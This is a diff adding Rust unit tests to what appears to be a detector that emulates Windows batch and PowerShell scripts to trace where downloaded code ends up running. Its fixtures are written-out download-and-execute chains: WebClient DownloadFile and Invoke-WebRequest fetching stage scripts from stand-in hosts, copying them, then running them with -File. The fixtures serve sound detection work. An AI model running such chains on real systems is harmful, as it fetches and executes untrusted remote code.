@@ -10309,8 +10309,10 @@ call %COMSPEC% /V:ON /c "set U=https://call-escaped.example/payload.exe&&curl -o
 
 #[cfg(test)]
 mod powershell_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
+    use crate::Trait;
     use base64::Engine;
 
     #[test]
@@ -10484,6 +10486,140 @@ mod powershell_tests {
         assert!(
             env.exec_ps1.iter().any(|payload| payload == &ps1),
             "PowerShell -File slash-equivalent script was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_get_content_set_content_copy_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-copy-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Get-Content '%TEMP%\downloaded.ps1' | Set-Content '%TEMP%\copied.ps1'"
+powershell -NoProfile -File "%TEMP%\copied.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("copied.ps1")
+                        && url == "https://ps-copy-provenance.example/stage.ps1"
+            )),
+            "PowerShell copied script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_get_content_set_content_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-set-content-copy.example/stage.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\source.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r#"powershell -Command "Get-Content C:\Temp\source.ps1 | Set-Content C:\Temp\copied.ps1""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -NoProfile -File C:\Temp\copied.ps1"#,
+            &mut env,
+        );
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Get-Content|Set-Content script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_get_content_out_file_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-out-file-copy.example/stage.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\source.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r#"powershell -Command "Get-Content C:\Temp\source.ps1 | Out-File C:\Temp\copied.ps1""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -NoProfile -File C:\Temp\copied.ps1"#,
+            &mut env,
+        );
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Get-Content|Out-File script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_get_content_out_file_filepath_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-out-file-path-copy.example/stage.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\source.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r#"powershell -Command "Get-Content C:\Temp\source.ps1 | Out-File -FilePath:C:\Temp\copied.ps1""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -NoProfile -File C:\Temp\copied.ps1"#,
+            &mut env,
+        );
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Get-Content|Out-File -FilePath script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn powershell_get_content_stdout_redirect_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-stdout-redirect-copy.example/stage.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\source.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r#"powershell -Command "Get-Content C:\Temp\source.ps1 > C:\Temp\copied.ps1""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -NoProfile -File C:\Temp\copied.ps1"#,
+            &mut env,
+        );
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Get-Content stdout redirection script content was not queued: {:?}",
             env.exec_ps1
         );
     }
